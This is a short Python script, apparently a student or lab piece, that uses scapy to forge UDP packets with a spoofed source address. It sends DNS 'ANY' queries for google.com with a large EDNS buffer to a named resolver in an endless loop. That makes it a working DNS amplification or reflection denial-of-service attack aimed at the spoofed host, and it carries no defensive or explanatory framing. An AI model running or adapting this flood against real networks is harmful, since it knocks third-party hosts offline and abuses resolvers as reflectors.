from scapy.all import *
import threading
import sys, os,time 

def main():
	fakesrc = '192.168.1.149'
	server = '128.186.6.103'
	device = 'wlp58s0'

	mypacket = IP(dst=server, src=fakesrc)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ALL", qclass="IN"), ar=DNSRROPT(rclass=4096))
	#request-
	while(1):
		send(mypacket)
if __name__=="__main__":
	main()
